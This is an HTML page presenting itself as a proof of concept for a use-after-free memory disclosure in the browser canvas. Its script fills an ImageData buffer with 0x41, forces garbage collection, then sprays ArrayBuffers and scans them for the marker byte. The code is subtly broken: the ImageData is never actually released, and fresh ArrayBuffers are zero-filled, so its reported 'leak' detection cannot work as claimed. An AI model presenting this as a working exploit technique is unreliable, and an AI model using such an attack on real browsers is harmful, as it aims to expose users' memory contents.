<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Canvas UAF Memory Disclosure PoC</title>
  <style>
    body { font-family: sans-serif; }
    #trigger { padding: 10px; font-size: 16px; cursor: pointer; }
    #console { white-space: pre; background: #eee; padding: 10px; max-height: 300px; overflow-y: auto; }
  </style>
</head>
<body>
  <h1>Canvas UAF Memory Disclosure PoC</h1>
  <button id="trigger">Run PoC</button>
  <div id="console"></div>

  <canvas id="canvas" width="512" height="512" style="display:none;"></canvas>

  <script>
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    const consoleDiv = document.getElementById('console');

    function log(msg) {
      consoleDiv.textContent += msg + '\n';
      consoleDiv.scrollTop = consoleDiv.scrollHeight;
    }

    function stressGC() {
      const tmp = [];
      for (let i = 0; i < 10000; i++) {
        tmp.push(new ArrayBuffer(1024 * 10));
      }
    }

    function fillImageData(imageData, value) {
      const buf = new Uint8Array(imageData.data.buffer);
      buf.fill(value);
    }

    function attemptMemoryDisclosure() {
      log('Starting UAF Memory Disclosure attempt...');

      // Step 1: Create and fill ImageData
      const imgData = ctx.createImageData(512, 512);
      fillImageData(imgData, 0x41); // Fill with known value 'A'

      // Step 2: Simulate freeing by dropping references and forcing GC
      const weakRef = new WeakRef(imgData);
      log('ImageData created, now dropping reference and forcing GC...');
      stressGC();

      // Step 3: Allocate multiple ArrayBuffers hoping to occupy freed memory
      const leakers = [];
      for (let i = 0; i < 5000; i++) {
        leakers.push(new ArrayBuffer(imgData.data.buffer.byteLength));
      }

      // Step 4: Attempt to read residual data
      let leakDetected = false;

      for (let i = 0; i < leakers.length; i++) {
        const view = new Uint8Array(leakers[i]);
        for (let j = 0; j < 100; j++) {  // Only sample first 100 bytes
          if (view[j] === 0x41) {
            log(`Potential leak detected in buffer ${i}, byte ${j}: 0x${view[j].toString(16)}`);
            leakDetected = true;
            break;
          }
        }
        if (leakDetected) break;
      }

      if (!leakDetected) {
        log('No memory leak detected on this attempt.');
      } else {
        log('Memory disclosure potentially successful!');
      }
    }

    document.getElementById('trigger').addEventListener('click', () => {
      attemptMemoryDisclosure();
    });
  </script>
</body>
</html>
